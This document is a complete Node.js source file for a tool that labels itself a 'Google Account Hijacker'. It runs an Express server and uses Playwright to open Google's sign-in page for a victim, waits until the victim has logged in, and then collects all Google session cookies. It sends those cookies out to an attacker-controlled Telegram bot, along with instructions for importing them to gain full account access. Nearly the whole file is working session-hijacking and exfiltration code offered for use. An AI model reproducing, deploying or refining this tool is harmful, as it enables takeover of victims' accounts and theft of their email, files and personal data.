// ================================================
// GOOGLE ACCOUNT HIJACKER - PLAYWRIGHT (RENDER FIXED)
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { chromium } = require('playwright-core');  // Changed to playwright-core
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const { randomUUID } = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ================================================
// STATE
// ================================================
let loginSession = {
    active: false,
    sessionId: null,
    status: 'idle',
    message: '',
    startTime: null,
    complete: false
};

// ================================================
// TELEGRAM CONFIG
// ================================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ================================================
// UPDATE SESSION STATUS
// ================================================
function updateSessionStatus(status, message) {
    loginSession.status = status;
    loginSession.message = message || '';
    console.log(`📊 Status: ${status} - ${message}`);
}

// ================================================
// SEND FILE TO TELEGRAM
// ================================================
async function sendFileToTelegram(filePath, caption = '') {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath));
        if (caption) form.append('caption', caption);

        const response = await axios.post(url, form, {
            headers: form.getHeaders()
        });
        console.log('✅ File sent to Telegram');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram file send error:', error.message);
        return null;
    }
}

// ================================================
// SEND TEXT TO TELEGRAM
// ================================================
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// ================================================
// CAPTURE GOOGLE ACCOUNT COOKIES
// ================================================
async function captureGoogleAccountCookies(sessionId) {
    let browser = null;
    let context = null;
    let page = null;

    try {
        console.log(`\n📧 [${sessionId}] Starting Google Account capture...`);
        updateSessionStatus('waiting', 'Opening browser...');
        await sendToTelegram(`🔄 <b>Google Account Capture Started</b>\n🆔 Session: ${sessionId}\n⏳ Please log in to your Google account.`);

        // ============================================
        // LAUNCH PLAYWRIGHT - RENDER DEPLOYMENT
        // ============================================
        console.log(`📧 [${sessionId}] Opening browser...`);

        browser = await chromium.launch({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-position=0,0',
                '--window-size=1280,900',
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-default-apps',
                '--disable-translate',
                '--disable-sync'
            ]
        });

        context = await browser.newContext({
            viewport: { width: 1280, height: 900 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        });

        page = await context.newPage();

        console.log(`📧 [${sessionId}] Browser opened successfully!`);

        // ============================================
        // GO TO GOOGLE ACCOUNT LOGIN
        // ============================================
        console.log(`📧 [${sessionId}] Navigating to Google Account login...`);
        updateSessionStatus('waiting', 'Opening Google Account login page...');

        await page.goto('https://accounts.google.com/v3/signin/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin', {
            waitUntil: 'networkidle',
            timeout: 60000
        });

        console.log(`📧 [${sessionId}] Login page loaded. Waiting for user...`);
        updateSessionStatus('waiting', 'Please log in to your Google account');
        await sendToTelegram(`🌐 <b>Login Page Opened</b>\n🆔 Session: ${sessionId}\n📧 Please enter your email and password.`);

        // ============================================
        // WAIT FOR LOGIN
        // ============================================
        let loggedIn = false;
        let elapsed = 0;
        const maxWait = 600000;
        const checkInterval = 3000;

        while (!loggedIn && elapsed < maxWait) {
            await new Promise(resolve => setTimeout(resolve, checkInterval));
            elapsed += checkInterval;

            try {
                const currentUrl = page.url();
                console.log(`📧 [${sessionId}] Current URL: ${currentUrl.substring(0, 80)}...`);

                try {
                    const pageContent = await page.evaluate(() => {
                        const hasProfileIcon = document.querySelector('img[alt*="profile"]') !== null ||
                                               document.querySelector('img[class*="avatar"]') !== null;
                        const hasEmail = document.querySelector('[data-email]') !== null;
                        const hasAccountNav = document.querySelector('nav[aria-label*="Account"]') !== null ||
                                              document.querySelector('a[href*="account"]') !== null;
                        const hasSettings = document.querySelector('a[href*="settings"]') !== null ||
                                            document.querySelector('a[href*="data-and-personalization"]') !== null;

                        const isGoogleAccount = window.location.href.includes('myaccount.google.com');
                        const isLoginPage = document.querySelector('form[action*="signin"]') !== null ||
                                            document.querySelector('input[type="password"]') !== null ||
                                            window.location.href.includes('accounts.google.com/signin');

                        return {
                            hasProfileIcon,
                            hasEmail,
                            hasAccountNav,
                            hasSettings,
                            isGoogleAccount,
                            isLoginPage
                        };
                    });

                    if ((pageContent.isGoogleAccount || pageContent.hasProfileIcon || pageContent.hasEmail || pageContent.hasAccountNav) &&
                        !pageContent.isLoginPage) {
                        loggedIn = true;
                        console.log(`📧 [${sessionId}] ✅ GOOGLE ACCOUNT LOGIN DETECTED!`);
                        updateSessionStatus('complete', 'Login successful!');
                        await sendToTelegram(`✅ <b>Google Account Login Detected!</b>\n🆔 Session: ${sessionId}\n📧 Navigating to Gmail...`);
                        break;
                    }

                } catch (e) {
                    console.log(`📧 [${sessionId}] ⚠️ Page check error:`, e.message);
                }

                if (elapsed % 30000 === 0) {
                    const minutesLeft = Math.floor((maxWait - elapsed) / 60000);
                    const secondsLeft = Math.floor(((maxWait - elapsed) % 60000) / 1000);
                    console.log(`📧 [${sessionId}] ⏳ Waiting... ${minutesLeft}m ${secondsLeft}s remaining`);
                    updateSessionStatus('waiting', `Waiting for login... ${minutesLeft}m ${secondsLeft}s remaining`);
                }

            } catch (e) {
                console.log(`📧 [${sessionId}] 🔄 Page navigation...`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!loggedIn) {
            console.log(`📧 [${sessionId}] ❌ Login timeout`);
            updateSessionStatus('failed', 'Login timeout. Please try again.');
            await sendToTelegram(`⏱️ <b>Login Timeout</b>\n🆔 Session: ${sessionId}\n❌ Please try again.`);
            return null;
        }

        // ============================================
        // NAVIGATE TO GMAIL
        // ============================================
        console.log(`📧 [${sessionId}] 🌐 Navigating to Gmail...`);
        updateSessionStatus('waiting', 'Navigating to Gmail...');

        await page.goto('https://mail.google.com/mail/u/0/#inbox', {
            waitUntil: 'networkidle',
            timeout: 60000
        });
        console.log(`📧 [${sessionId}] ✅ Gmail loaded!`);
        await new Promise(resolve => setTimeout(resolve, 5000));

        // ============================================
        // CAPTURE COOKIES
        // ============================================
        console.log(`📧 [${sessionId}] 🍪 Capturing cookies...`);
        let cookies = await context.cookies();
        console.log(`📧 [${sessionId}] ✅ Got ${cookies.length} cookies!`);

        if (cookies.length === 0) {
            console.log(`📧 [${sessionId}] ❌ No cookies found!`);
            updateSessionStatus('failed', 'No cookies found.');
            await sendToTelegram(`❌ <b>No Cookies Found</b>\n🆔 Session: ${sessionId}`);
            return null;
        }

        // ============================================
        // FORMAT AND SAVE COOKIES
        // ============================================
        const formattedCookies = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain || '.google.com',
            path: cookie.path || '/',
            expires: cookie.expires || -1,
            httpOnly: cookie.httpOnly || false,
            secure: cookie.secure || false,
            sameSite: cookie.sameSite || 'Lax'
        }));

        const filename = `google_account_${sessionId}.json`;
        const filePath = path.join(__dirname, filename);
        fs.writeFileSync(filePath, JSON.stringify(formattedCookies, null, 2));

        // ============================================
        // SEND TO TELEGRAM
        // ============================================
        const caption = `🔐 <b>Google Account Cookies</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 <b>Session:</b> ${sessionId}\n` +
            `📊 <b>Total Cookies:</b> ${cookies.length}\n` +
            `📧 <b>Account:</b> Full Google Account\n` +
            `📁 <b>Services Access:</b>\n` +
            `   • Gmail: ✅ Full Access\n` +
            `   • Drive: ✅ Full Access\n` +
            `   • Photos: ✅ Full Access\n` +
            `   • YouTube: ✅ Full Access\n` +
            `   • Calendar: ✅ Full Access\n` +
            `   • Contacts: ✅ Full Access\n` +
            `   • All Services: ✅ Full Access\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `💡 <b>How to use:</b> Import this JSON file into your browser`;

        await sendFileToTelegram(filePath, caption);

        // ============================================
        // SEND IMPORTANT COOKIES SUMMARY
        // ============================================
        const important = ['SID', 'SAPISID', 'APISID', 'SSID', 'HSID', 'NID', 'SIDCC', 'LSID', 'GMAIL_AT', '__Secure-3PSID', '__Secure-3PAPISID'];
        let summary = `🔑 <b>Important Cookies Captured:</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        let allPresent = true;
        important.forEach(name => {
            const found = cookies.find(c => c.name === name);
            const status = found ? '✅' : '❌';
            if (!found) allPresent = false;
            summary += `  ${name}: ${status} ${found ? 'Present' : 'Missing'}\n`;
        });
        summary += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        summary += allPresent ? '✅ <b>All essential cookies present!</b>' : '⚠️ <b>Some cookies missing - may need to login again.</b>';
        summary += `\n📁 <b>File:</b> ${filename}`;
        await sendToTelegram(summary);

        // ============================================
        // CLEAN UP
        // ============================================
        try { fs.unlinkSync(filePath); } catch (e) {}

        console.log(`📧 [${sessionId}] ✅ Cookies sent to Telegram!`);
        updateSessionStatus('complete', 'Authentication successful!');

        // ============================================
        // CLOSE BROWSER - NO REDIRECT
        // ============================================
        console.log(`📧 [${sessionId}] ⏳ Closing browser...`);
        await new Promise(resolve => setTimeout(resolve, 3000));

        return cookies;

    } catch (error) {
        console.error(`❌ [${sessionId}] Error:`, error.message);
        updateSessionStatus('failed', `Error: ${error.message}`);
        await sendToTelegram(`❌ <b>Error</b>\n🆔 Session: ${sessionId}\n📝 ${error.message}`);
        return null;

    } finally {
        if (browser) {
            try { await browser.close(); } catch (e) {}
        }
        console.log(`📧 [${sessionId}] 🔒 Browser closed.`);
        loginSession.complete = true;
        setTimeout(() => {
            if (loginSession.sessionId === sessionId) {
                loginSession.active = false;
                loginSession.sessionId = null;
                loginSession.status = 'idle';
                loginSession.message = '';
                loginSession.startTime = null;
                loginSession.complete = false;
            }
        }, 3000);
    }
}

// ================================================
// ROUTES
// ================================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth/google', async (req, res) => {
    console.log('🔐 Starting Google Account capture...');

    const sessionId = randomUUID().substring(0, 8);
    loginSession.active = true;
    loginSession.sessionId = sessionId;
    loginSession.status = 'waiting';
    loginSession.message = 'Starting authentication...';
    loginSession.startTime = Date.now();
    loginSession.complete = false;

    captureGoogleAccountCookies(sessionId).catch(err => {
        console.error('❌ Capture error:', err);
        updateSessionStatus('failed', err.message);
        loginSession.complete = true;
    });

    res.json({
        success: true,
        sessionId: sessionId,
        message: 'Authentication started. Please log in the new window.'
    });
});

app.get('/auth/status', (req, res) => {
    res.json({
        active: loginSession.active,
        sessionId: loginSession.sessionId,
        status: loginSession.status,
        message: loginSession.message,
        elapsed: loginSession.startTime ? Math.floor((Date.now() - loginSession.startTime) / 1000) : 0,
        complete: loginSession.complete || false
    });
});

app.post('/auth/cancel', (req, res) => {
    loginSession.active = false;
    loginSession.status = 'idle';
    loginSession.message = 'Cancelled by user';
    loginSession.complete = true;
    res.json({ success: true });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'google-account-hijacker',
        telegram: BOT_TOKEN ? 'configured' : 'not configured'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   🔐 GOOGLE ACCOUNT HIJACKER                                 ║
║                                                               ║
║   📡 Server: http://localhost:${PORT}                          ║
║   📨 TELEGRAM: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}
║                                                               ║
║   🔧 DEPLOYMENT READY                                        ║
║   🔧 NO REDIRECT - STAYS ON PAGE                            ║
║   🔧 FULL GOOGLE ACCESS                                     ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
    `);
});
